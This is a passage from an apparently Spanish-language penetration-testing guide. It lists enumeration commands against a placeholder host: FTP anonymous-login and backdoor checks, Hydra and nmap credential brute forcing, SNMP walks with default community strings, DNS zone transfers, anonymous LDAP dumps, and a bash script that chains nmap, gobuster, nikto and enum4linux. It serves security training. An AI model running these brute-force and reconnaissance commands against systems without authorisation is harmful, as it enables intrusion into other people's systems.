# Try: anonymous / anonymous or ftp / ftp

# Nmap FTP scripts
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 10.10.10.1
```

#### 2. FTP Bruteforce
```bash
# Hydra brute force
hydra -L users.txt -P passwords.txt ftp://10.10.10.1

# Nmap brute force
nmap --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt -p 21 10.10.10.1
```

### SNMP Enumeration (Puerto 161)

#### 1. SNMP Walking
```bash
# SNMPwalk
snmpwalk -c public -v1 10.10.10.1
snmpwalk -c private -v1 10.10.10.1
snmpwalk -c manager -v1 10.10.10.1

# Specific OIDs
snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.1  # System info
snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.25.6.3.1.2  # Installed software
```

#### 2. SNMP Tools
```bash
# snmp-check
snmp-check 10.10.10.1 -c public

# onesixtyone - SNMP scanner
onesixtyone -c community.txt 10.10.10.1

# SNMPenum
snmpenum 10.10.10.1 public windows.txt
```

### DNS Enumeration (Puerto 53)

#### 1. Zone Transfer Attempts
```bash
# Attempt zone transfer
dig axfr target.com @10.10.10.1
dig axfr @10.10.10.1 target.com

# DNS reconnaissance
dnsrecon -d target.com -n 10.10.10.1
dnsenum --dnsserver 10.10.10.1 target.com
```

#### 2. DNS Brute Forcing
```bash
# Subdomain brute forcing
dnsrecon -d target.com -D /usr/share/wordlists/dnsmap.txt -t brt

# Reverse DNS lookup
dnsrecon -r 10.10.10.0/24 -n 10.10.10.1
```

### LDAP Enumeration (Puerto 389/636)

#### 1. Basic LDAP Queries
```bash
# Anonymous bind test
ldapsearch -x -h 10.10.10.1 -s base namingcontexts

# Dump LDAP information
ldapsearch -x -h 10.10.10.1 -s sub -b "DC=domain,DC=local"

# Search for users
ldapsearch -x -h 10.10.10.1 -s sub -b "DC=domain,DC=local" "(objectClass=user)"
```

#### 2. LDAP Tools
```bash
# ldapenum
python3 ldapenum.py 10.10.10.1

# windapsearch
python3 windapsearch.py -d domain.local --dc-ip 10.10.10.1 -U
```

### Service-Specific Scripts and Automation

#### 1. AutoRecon - Automated Enumeration
```bash
# Install AutoRecon
pip3 install autorecon

# Run comprehensive enumeration
autorecon 10.10.10.1

# Multiple targets
autorecon 10.10.10.0/24 -t targets.txt
```

#### 2. Custom Enumeration Script
```bash
#!/bin/bash
# enum_all.sh - Comprehensive service enumeration

TARGET=$1
WORDLIST="/usr/share/wordlists/dirb/common.txt"

echo "[+] Starting enumeration for $TARGET"

# Port scan
echo "[+] Running Nmap scan..."
nmap -sC -sV -oA nmap_$TARGET $TARGET

# HTTP enumeration if port 80 is open
if nmap -p 80 $TARGET | grep -q "open"; then
    echo "[+] HTTP enumeration..."
    gobuster dir -u http://$TARGET -w $WORDLIST -x php,html,txt -o http_enum.txt
    whatweb http://$TARGET
    nikto -h http://$TARGET -o nikto_results.txt
fi

# HTTPS enumeration if port 443 is open
if nmap -p 443 $TARGET | grep -q "open"; then
    echo "[+] HTTPS enumeration..."
    gobuster dir -u https://$TARGET -w $WORDLIST -x php,html,txt -o https_enum.txt
    sslscan $TARGET:443
fi

# SMB enumeration if ports 139/445 are open
if nmap -p 139,445 $TARGET | grep -q "open"; then
    echo "[+] SMB enumeration..."
    enum4linux -a $TARGET > smb_enum.txt
    smbmap -H $TARGET
fi

echo "[+] Enumeration completed for $TARGET"
```

---

## 🔍 Fase 4: Análisis de Vulnerabilidades

